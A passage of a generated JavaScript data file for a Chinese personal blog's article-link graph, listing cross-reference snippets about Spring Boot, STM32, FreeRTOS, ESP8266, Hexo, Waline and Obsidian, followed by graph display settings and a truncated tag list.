`@Configuration` 注解\n> 告诉 Spring Boot 这是一个配置类，可以在该类中创建 Bean。更多声明第三方 Bean 细节详看：[[1713466548|SpringBoot 中的 IOC & DI 入门]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"565697069","target":"1713466548","report":[]},{"id":62,"context":["> [!hint] `@ConfigurationProperties` 注解\n> 和配置文件（比如 `application.yml`）进行绑定，将配置文件中对应的配置映射到对象的属性中。在这里是把配置文件 `myrandom.lenth` 中的值映射到 `MyRandomProperties` 对象的 `length` 中。详见：[[2487324783|SpringBoot 中的配置]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"565697069","target":"2487324783","report":[]},{"id":63,"context":["> 前端项目部署方式可看：[[1032806896|Ant Design Pro 前端项目初始化到部署上线]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2985240736","target":"1032806896","report":[]},{"id":64,"context":["> 关于 nohup 命令详看：[[2445395019|Linux 使用 nohup 后台运行程序]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2985240736","target":"2445395019","report":[]},{"id":65,"context":["本篇文章介绍使用 STM32CubeMX 创建 STM32 工程的文章，并实现一个 LED 点灯的案例。如果打算使用寄存器或标准库方式创建项目，可移步这篇文章：[[1813829584|STM32 工程的创建 - 基于寄存器或标准库]]。关于 Keil 的更多使用技巧可详看这篇文章：[[2617906225|Keil 的使用技巧与问题解决]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1401105135","target":"1813829584","report":[]},{"id":66,"context":["如果还想接着移植 FreeRTOS，可以继续阅读这篇文章：[[2115225612|STM32 移植 FreeRTOS - 基于 HAL 库]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1401105135","target":"2115225612","report":[]},{"id":67,"context":["本篇文章介绍使用 STM32CubeMX 创建 STM32 工程的文章，并实现一个 LED 点灯的案例。如果打算使用寄存器或标准库方式创建项目，可移步这篇文章：[[1813829584|STM32 工程的创建 - 基于寄存器或标准库]]。关于 Keil 的更多使用技巧可详看这篇文章：[[2617906225|Keil 的使用技巧与问题解决]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1401105135","target":"2617906225","report":[]},{"id":68,"context":["这里介绍基于寄存器或标准库方式创建 STM32 工程（以 STM32F103C8T6 为例，其它型号大差不差），并通过点灯演示示例。基于 HAL 库方式请移步：[[1401105135|STM32 工程的创建 - 基于 HAL 库]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1813829584","target":"1401105135","report":[]},{"id":69,"context":["进一步，你可以尝试移植 FreeRTOS，详看：[[2165426052|STM32 移植 FreeRTOS - 基于标准库]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1813829584","target":"2165426052","report":[]},{"id":70,"context":["软件安装提示：阅读前请准备好 Keil uVision5 MDK 的安装（可以和 Keil C51 安在一起），软件需破解。安装和破解过程不再赘述。Keil 的一些使用技巧可以看这篇文章：[[2617906225|Keil 的使用技巧与问题解决]]","解决方法见：[[2617906225|Keil 的使用技巧与问题解决]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1813829584","target":"2617906225","report":[]},{"id":71,"context":["本文介绍使用 STM32CubeMX 创建一个包含 FreeRTOS 的工程。关于 STM32CubeMX 的安装另见：[[1401105135|STM32 工程的创建 - 基于 HAL 库]]。此外，这篇文章将在 [[1401105135|基础工程]] 之上直接实现利用 FreeRTOS 进行点灯操作。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2115225612","target":"1401105135","report":[]},{"id":72,"context":["详看：[[1545394726|串口驱动程序之「发送数据」]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2165426052","target":"1545394726","report":[]},{"id":73,"context":["移植前我们需要有一个基础工程。首先构建一个最简单的 STM-32 基于标准库方式开发的工程（详见 [[1813829584|STM32 工程的创建 - 基于寄存器或标准库]]）","> 如果你已经移植好可以跳过这一步。这里主要是为了无缝衔接 [[1813829584|这篇文章]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2165426052","target":"1813829584","report":[]},{"id":74,"context":["1. C 语言基本语法\n2. STM32 工程创建，详看\n\t- [[1813829584|STM32 工程的创建 - 基于寄存器或标准库]]\n\t- [[1401105135|STM32 工程的创建 - 基于 HAL 库]]\n3. FreeRTOS 的移植，详看\n\t- [[2165426052|STM32 移植 FreeRTOS - 基于标准库]]\n\t- [[2115225612|STM32 移植 FreeRTOS - 基于 HAL 库]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"1401105135","report":[]},{"id":75,"context":["1. STM32 串口 1 用于向电脑发送数据，`printf` 重写为向串口 1 发送数据。详看：[[1545394726|串口驱动程序之「发送数据」]]\n2. 串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：[[2867239616|串口驱动程序之「不定长字符串的接收」]]\n3. 使用 DHT11 检测环境温湿度。详看：[[3298282303|DHT11 驱动程序]]\n4. OLED 模块作为温湿度数据的实时显示。详看：[[2349657556|OLED 驱动程序]]\n5. 一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死\n6. 一个 LED 灯用来应答阿里云发来的数据"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"1545394726","report":[]},{"id":76,"context":["1. C 语言基本语法\n2. STM32 工程创建，详看\n\t- [[1813829584|STM32 工程的创建 - 基于寄存器或标准库]]\n\t- [[1401105135|STM32 工程的创建 - 基于 HAL 库]]\n3. FreeRTOS 的移植，详看\n\t- [[2165426052|STM32 移植 FreeRTOS - 基于标准库]]\n\t- [[2115225612|STM32 移植 FreeRTOS - 基于 HAL 库]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"1813829584","report":[]},{"id":77,"context":["1. C 语言基本语法\n2. STM32 工程创建，详看\n\t- [[1813829584|STM32 工程的创建 - 基于寄存器或标准库]]\n\t- [[1401105135|STM32 工程的创建 - 基于 HAL 库]]\n3. FreeRTOS 的移植，详看\n\t- [[2165426052|STM32 移植 FreeRTOS - 基于标准库]]\n\t- [[2115225612|STM32 移植 FreeRTOS - 基于 HAL 库]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"2115225612","report":[]},{"id":78,"context":["1. C 语言基本语法\n2. STM32 工程创建，详看\n\t- [[1813829584|STM32 工程的创建 - 基于寄存器或标准库]]\n\t- [[1401105135|STM32 工程的创建 - 基于 HAL 库]]\n3. FreeRTOS 的移植，详看\n\t- [[2165426052|STM32 移植 FreeRTOS - 基于标准库]]\n\t- [[2115225612|STM32 移植 FreeRTOS - 基于 HAL 库]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"2165426052","report":[]},{"id":79,"context":["1. STM32 串口 1 用于向电脑发送数据，`printf` 重写为向串口 1 发送数据。详看：[[1545394726|串口驱动程序之「发送数据」]]\n2. 串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：[[2867239616|串口驱动程序之「不定长字符串的接收」]]\n3. 使用 DHT11 检测环境温湿度。详看：[[3298282303|DHT11 驱动程序]]\n4. OLED 模块作为温湿度数据的实时显示。详看：[[2349657556|OLED 驱动程序]]\n5. 一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死\n6. 一个 LED 灯用来应答阿里云发来的数据"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"2349657556","report":[]},{"id":80,"context":["首先，固件烧录部分详看：[[2777136240|ESP8266 烧写 AT MQTT 固件]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"2777136240","report":[]},{"id":81,"context":["1. STM32 串口 1 用于向电脑发送数据，`printf` 重写为向串口 1 发送数据。详看：[[1545394726|串口驱动程序之「发送数据」]]\n2. 串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：[[2867239616|串口驱动程序之「不定长字符串的接收」]]\n3. 使用 DHT11 检测环境温湿度。详看：[[3298282303|DHT11 驱动程序]]\n4. OLED 模块作为温湿度数据的实时显示。详看：[[2349657556|OLED 驱动程序]]\n5. 一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死\n6. 一个 LED 灯用来应答阿里云发来的数据"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"2867239616","report":[]},{"id":82,"context":["1. STM32 串口 1 用于向电脑发送数据，`printf` 重写为向串口 1 发送数据。详看：[[1545394726|串口驱动程序之「发送数据」]]\n2. 串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：[[2867239616|串口驱动程序之「不定长字符串的接收」]]\n3. 使用 DHT11 检测环境温湿度。详看：[[3298282303|DHT11 驱动程序]]\n4. OLED 模块作为温湿度数据的实时显示。详看：[[2349657556|OLED 驱动程序]]\n5. 一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死\n6. 一个 LED 灯用来应答阿里云发来的数据"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3727808739","target":"3298282303","report":[]},{"id":83,"context":["- 开始菜单栏右键菜单中新建「Markdown」文件\n- Typora 集成图床：[[377267818|Typora 应用 PicGo(app) 使用图床]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1135491326","target":"377267818","report":[]},{"id":84,"context":["请移步这篇文章 [[3992879191|PicGo(app) 配置腾讯云 COS 图床]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"377267818","target":"3992879191","report":[]},{"id":85,"context":["[^1]: 参考[[1867823418|Linux 服务器 HTTPS 的配置]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2062987538","target":"1867823418","report":[]},{"id":86,"context":["1. 串口 1 连接电脑。`printf` 重写，输出至串口 1。详看：[[1545394726|串口驱动程序之「发送数据」]]\n2. 串口 2 连接 ESP8266。`ESP8266_Printf` 函数重写 `sprintf`，输出到串口 2。\n3. 函数 `uint8_t ESP8266_Cmd(uint8_t *cmd,uint8_t *expect_ack,uint16_t waittime)` 用于发送 AT 命令，并将收到结果回显至电脑（解注释 printf）。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2867239616","target":"1545394726","report":[]},{"id":87,"context":["> 「善意的推定」详见：[[3449001268|「蕴含」与「等价」自然语言表达的理解]] 脚注。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2214581713","target":"3449001268","report":[]},{"id":88,"context":["其他 Waline 评论区美化教程：[[3709373237|定制自己的 Waline 评论系统]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3015602463","target":"3709373237","report":[]},{"id":89,"context":["- [[888931094|go-cqhttp 部署与简单编程]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3118126311","target":"888931094","report":[]},{"id":90,"context":["> 不了解 cron 可以查看这篇文章：[[2287168649|Linux 使用 Cron 创建定时任务]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3118126311","target":"2287168649","report":[]},{"id":91,"context":["> 任何时候使用任何 API 时都要注意保护好密钥。详见：[[2958737902|将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3118126311","target":"2958737902","report":[]},{"id":92,"context":["可参考这篇文章：[[107080905|Nginx 的安装与反向代理配置]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2201181434","target":"107080905","report":[]},{"id":93,"context":["[[4084230277|解决 Bing 搜索页自动返回顶部的问题]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1309833614","target":"4084230277","report":[]},{"id":94,"context":["- [[3569112562|Hexo 博客适配 Obsidian 新语法]]\n- [[85495977|构建 Obsidian 的 Hexo 写作工作流]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1982369523","target":"85495977","report":[]},{"id":95,"context":["这篇文章展示双链渲染测试效果。本文测试的链接为：[[1011516134|Markdown 渲染测试]]。","## 双链 [[1011516134|Markdown 渲染测试]]","### 双链 [[1011516134|Markdown 渲染测试]]","#### 双链 [[1011516134|Markdown 渲染测试]]","正文：[[1011516134|Markdown 渲染测试]]。","粗体内：**这是一 [[1011516134|Markdown 渲染测试]] 段文字**。","斜体内：*这是一 [[1011516134|Markdown 渲染测试]] 段文字。*","行内代码不应该渲染：`code [[1011516134|Markdown 渲染测试]] code`","行内公式不应该渲染：$a+a=2a~[[1011516134|Markdown 渲染测试]] ~ b*b=b^2$","链接内不应该渲染，格式怪怪的：[链接 [[1011516134|Markdown 渲染测试]] 文字](https://uuanqin.top)","图片内描述文字可以渲染（Hexo Butterfly 主题显示得不错）：![链接[[1011516134|Markdown 渲染测试]]文字](https://commonmark.org/help/images/favicon.png)","- [[1011516134|Markdown 渲染测试]]\n\t- [[1011516134|Markdown 渲染测试]]","1. [[1011516134|Markdown 渲染测试]]\n\t1. [[1011516134|Markdown 渲染测试]]","> 引言块 [[1011516134|Markdown 渲染测试]]\n>\n> > 嵌套引言块：[[1011516134|Markdown 渲染测试]]\n> >\n> > > 嵌套引言块：[[1011516134|Markdown 渲染测试]]\n> > >","```java\n[[1011516134|Markdown 渲染测试]]\n```","$$\n[[1011516134|Markdown 渲染测试]]\n$$","| 表格渲染 | [[1011516134|Markdown 渲染测试]] |\n| ---- | ----------------- |\n| 单元格  | [[1011516134|Markdown 渲染测试]] |","<details><summary>HTML折叠  [[1011516134|Markdown 渲染测试]] </summary>\n<p>","<table><tbody>\n    <tr>\n        <th rowspan=\"3\">HTML表格</th>\n        <th><font color=\"Green\">[[1011516134|Markdown 渲染测试]]</font></th>\n        <th>第二列</th>\n        <th>第三列</th>\n    </tr>\n    <tr>\n        <td bgcolor=\"Tomato\">第一列</td>\n        <td>[[1011516134|Markdown 渲染测试]]</td>\n        <td>第三列</td>\n    </tr>\n    <tr>\n        <td>第一列</td>\n        <td>第二列</td>\n        <td>[[1011516134|Markdown 渲染测试]]</td>\n    </tr>\n</table>","> [!note] 标题：[[1011516134|Markdown 渲染测试]]\n> 正文：[[1011516134|Markdown 渲染测试]]\n>\n> > [!warning] 嵌套 Callout：[[1011516134|Markdown 渲染测试]]\n> > [[1011516134|Markdown 渲染测试]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1982369523","target":"1011516134","report":[]},{"id":96,"context":["- [ ] 任务列表 [[1982369523|双链渲染测试]]\n\t- [x] [[1982369523|双链渲染测试]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1982369523","target":"1982369523","report":[]},{"id":97,"context":["- [[3569112562|Hexo 博客适配 Obsidian 新语法]]\n- [[85495977|构建 Obsidian 的 Hexo 写作工作流]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1982369523","target":"3569112562","report":[]},{"id":98,"context":["[^hexo]: 详看我的这篇文章：[[181570378|部署 Hexo 个人博客框架到服务器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2065118013","target":"181570378","report":[]},{"id":99,"context":["[^hb]: fontawesome 可以考虑更换图标库，请看我之前的文章 [[1215492985|装点你的 Butterfly 博客]]\n[^bw]: 处理这个问题前请看我之前的文章：[[1495212389|Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2065118013","target":"1215492985","report":[]},{"id":100,"context":["[^hb]: fontawesome 可以考虑更换图标库，请看我之前的文章 [[1215492985|装点你的 Butterfly 博客]]\n[^bw]: 处理这个问题前请看我之前的文章：[[1495212389|Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2065118013","target":"1495212389","report":[]},{"id":101,"context":["如果想为评论区增加悬浮小气泡输入提醒，详见这篇文章：[[3015602463|为评论系统增加输入提醒【Waline】]]","详看这篇文章：[[3015602463|为评论系统增加输入提醒【Waline】]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3709373237","target":"3015602463","report":[]},{"id":102,"context":["1. Waline 邮件通知的设置\n2. 输入 QQ 邮箱自动获取 QQ 头像的配置\n3. 评论区美化要点\n4. 评论安全\n\t1. 设置违禁词的方法\n\t2. 设置 IP 黑名单\n\t3. 使用 Turnstile 验证码服务\n5. 评论外链中间页详见：[[3790495434|Hexo 博客与 Waline 评论区实现外链跳转中间页]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3709373237","target":"3790495434","report":[]},{"id":103,"context":["我想搭一个 Hexo 博客网站：[[181570378|部署 Hexo 个人博客框架到服务器]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2346883624","target":"181570378","report":[]},{"id":104,"context":["我想搭一个 Wordpress 博客网站：[[930915372|在 ECS 中搭建 WordPress]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2346883624","target":"930915372","report":[]},{"id":105,"context":["参看我的另一篇文章：[[1867823418|Linux 服务器 HTTPS 的配置]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2346883624","target":"1867823418","report":[]},{"id":106,"context":["- Wordpress： [【WordPress】 网站打开速度太慢了，两招解决\\_wordpress 太慢\\_辉哥笔记的博客-CSDN 博客](https://blog.csdn.net/lieweihan0913/article/details/95631632)\n- Hexo：[[2065118013|国内访问 Hexo 优化加速（CDN链接替换）]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2346883624","target":"2065118013","report":[]},{"id":107,"context":["精华文章：[[2201181434|博客域名解析管理与网站 CDN 加速域名配置]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2346883624","target":"2201181434","report":[]},{"id":108,"context":["中间页的实现：[[3790495434|Hexo 博客与 Waline 评论区实现外链跳转中间页]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"2346883624","target":"3790495434","report":[]},{"id":109,"context":["如果想将 OFM 运用于 Hexo 中，提示文本丰富性，那么可以试试这篇文章：[[3569112562|Hexo 博客适配 Obsidian 新语法]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"85495977","target":"3569112562","report":[]},{"id":110,"context":["[^图床配置教程]: [[3992879191|PicGo(app) 配置腾讯云 COS 图床]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"85495977","target":"3992879191","report":[]},{"id":111,"context":["我的解决方法是将 Plantuml 部署在本地。具体本地部署 Plantuml 的方法详见：[[4272386753|本地部署 PlantUML]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"85495977","target":"4272386753","report":[]},{"id":112,"context":["- [[85495977|构建 Obsidian 的 Hexo 写作工作流]]\n- [[3569112562|Hexo 博客适配 Obsidian 新语法]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"746142122","target":"85495977","report":[]},{"id":113,"context":["双链语法是 Obsidian 最重要的特性。一开始，我也找到了相似的插件 `hexo-link-obsidian`，但是这个插件的使用过为复杂和苛刻（详看 [[2136059777|这篇文章]]）："],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"746142122","target":"2136059777","report":[]},{"id":114,"context":["在写新插件的过程中，我就是抱着贯彻「先看看别人怎么写，在自己改改」的理念进行的，这与我之前认为的必须把所有理论基础过一遍才能下手的观念有些不同（详看 [[3395837292|第一次开发 npm 插件]]）。在学校学习过程中，我们早就熟悉了先学理论再实践的方法论，比如：学习➡️考试➡️应用。但如果在文档资料稀少或时间精力紧缺的情况下，通过模仿学习别人的例子是一个更好的选择。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"746142122","target":"3395837292","report":[]},{"id":115,"context":["- [[85495977|构建 Obsidian 的 Hexo 写作工作流]]\n- [[3569112562|Hexo 博客适配 Obsidian 新语法]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"746142122","target":"3569112562","report":[]},{"id":116,"context":["1. 另外写一个脚本，每次 Hexo 构建时，都去遍历一遍文章，记录文章标题与文章 front-matter 中 abbrlink 的键值关系，就像我在 [[4139834099|另一个项目]] 做的那样。\n2. 字符串匹配，替换双链为 `<a>` 标签。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"746142122","target":"4139834099","report":[]},{"id":117,"context":["[^mdi]: 关于这两款插件的介绍可以参考：[[3569112562|Hexo 博客适配 Obsidian 新语法]] 中的第一部分","- [ ] 由于我的博客写作使用 Obsidian，内部链接一般使用双向链接的**双中括号**语法，这个插件暂时还识别不出。后续有时间改进一下。截至目前，双中括号语法已写新插件，这个问题有望解决：[[3569112562|Hexo 博客适配 Obsidian 新语法]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"127992739","target":"3569112562","report":[]},{"id":118,"context":["自定义侧边栏：[[90746120|Butterfly 不改动主题源码实现自定义侧边栏]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1215492985","target":"90746120","report":[]},{"id":119,"context":["自定义页脚：[[152796589|Butterfly 自定义页脚（不修改主题源码）]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1215492985","target":"152796589","report":[]},{"id":120,"context":["本文由原 [[414962704|Hexo 博客的写作与装饰]] 拆分而来。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1215492985","target":"414962704","report":[]},{"id":121,"context":["[[1495212389|Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1215492985","target":"1495212389","report":[]},{"id":122,"context":["> [!warning] 来自站长的教训\n> 使用 Algolia 搜索默认主题时，注意搜索界面不要有跳转到外国网站的链接（比如 power by 的 logo），否则可能会有 wxb 来电风险。参考 [[3790495434|Hexo 博客与 Waline 评论区实现外链跳转中间页]]。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1215492985","target":"3790495434","report":[]},{"id":123,"context":["夜间模式更改网站图标：[[4033695206|Butterfly 夜间模式变换顶部网站图标]]"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"1215492985","target":"4033695206","report":[]},{"id":124,"context":["[^Kylin]: 更多内容详见 [[1973703782|【麒麟实训】开始与结束]]\n今天谈论的话题是进入计算机软件行业的学习后，我对电子设备上的各种执念。"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3567162190","target":"1973703782","report":[]},{"id":125,"context":["[^Xmind]: 应该是这篇文章 [[3437638411|本地文件夹的多端同步]]，不过现在的文章内容可能有改版和修正。\n# day2 我对我所学专业的一点思考"],"type":"undefined","shape":{"stroke":"simple","dashInterval":null},"color":"#e1e1e1","colorHighlight":"#ff6a6a","source":"3567162190","target":"3437638411","report":[]}]};
        const graphProperties = {"select_origin":"directory","files_origin":"../data/","nodes_origin":"","links_origin":"","nodes_online":"","links_online":"","images_origin":"","export_target":"","history":true,"focus_max":2,"record_types":{"Archive":{"fill":"#805500","stroke":"#4d3300"},"博客相关":{"fill":"#08b6ab","stroke":"#05837b"},"核心协同":{"fill":"#A7F532","stroke":"#84c227"},"有感而发":{"fill":"#eb245f","stroke":"#ff274a"},"工具箱":{"fill":"#e29020","stroke":"#af6f18"},"社会生活":{"fill":"#858585","stroke":"#858585"},"Hexo":{"fill":"#54C3D9","stroke":"#4095a5"},"WordPress":{"fill":"#70868F","stroke":"#48565c"},"嵌入式":{"fill":"#105eda","stroke":"#0c48a6"},"数学与算法":{"fill":"#221f2e","stroke":"#3e3854"},"undefined":{"fill":"#d1d1d1","stroke":"#d1d1d1"}},"link_types":{"undefined":{"stroke":"simple","color":"#e1e1e1"}},"references_as_nodes":false,"references_type_label":"references","record_filters":[],"graph_background_color":"#ffffff","graph_highlight_color":"#ff6a6a","graph_highlight_on_hover":true,"graph_text_size":6,"graph_arrows":true,"node_size_method":"degree","node_size":10,"node_size_max":20,"node_size_min":2,"attraction_force":600,"attraction_distance_max":507,"attraction_vertical":0.36,"attraction_horizontal":0.36,"views":{},"record_metas":["date","description","cover","abbrlink","date","top_img"],"generate_id":"always","link_context":"tooltip","hide_id_from_record_header":true,"title":"半方池水半方田 - 文章关系图谱","author":"wuanqin","description":"只能懂一点点","keywords":["编程","博客","生活"],"link_symbol":"","csl":"","bibliography":"","csl_locale":"","css_custom":"","devtools":false,"lang":"en","name":""};
        const tagList = [{"name":"Navicat","nodes":["3237396916"]},{"name":"禅道","nodes":["3237396916"]},{"name":"嵌入式","nodes":["1813820909"]},{"name":"笔记","nodes":["1813820909"]},{"name":"多媒体","nodes":["1813820909"]},{"name":"MP3","nodes":["1813820909"]},{"name":"AVC","nodes":["1813820909"]},{"name":"010编辑器","nodes":["1813820909"]},{"name":"JPEG","nodes":["1813820909"]},{"name":"WAV","nodes":["1813820909"]},{"name":"AVI","nodes":["1813820909"]},{"name":"BMP","nodes":["1813820909"]},{"name":"DCT","nodes":["1813820909"]},{"name":"命题逻辑","nodes":["3449001268"]},{"name":"面试","nodes":["1973703782"]},{"name":"总结","nodes":["1973703782"]},{"name":"Deb包","nodes":["1433349372"]},{"name":"Kylin","nodes":["1433349372"]},{"name":"pyinstaller","nodes":["1433349372"]},{"name":"PyQt","nodes":["1433349372"]},{"name":"编译","nodes":["1433349372"]},{"name":"CSV","nodes":["1433349372"]},{"name":"lxml","nodes":["1433349372"]},{"name":"OLE","nodes":["1433349372"]},{"name":"Word","nodes":["1433349372"]},{"name":"XML","nodes":["1433349372"]},{"name":"CClose","nodes":["3273167773"]},{"name":"快捷键","nodes":["3273167773"]},{"name":"鼠标","nodes":["3273167773"]},{"name":"AutoHotKey","nodes":["3273167773"]},{"name":"前端","nodes":["1032806896"]},{"name":"Ant 